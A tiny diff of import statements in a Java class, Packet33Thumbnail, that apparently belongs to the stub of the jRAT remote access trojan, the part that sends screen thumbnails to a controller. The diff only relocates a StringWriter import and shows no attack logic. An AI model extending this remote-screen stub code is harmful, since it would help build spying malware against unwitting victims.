@@ -6,10 +6,10 @@ import java.awt.image.BufferedImage;
 import java.awt.image.DataBufferByte;
 import java.io.DataOutputStream;
 
+import pro.jrat.common.io.StringWriter;
 import pro.jrat.stub.Main;
 import pro.jrat.stub.RemoteScreen;
 
-import com.redpois0n.common.io.StringWriter;
 
 public class Packet33Thumbnail extends AbstractOutgoingPacket {
 
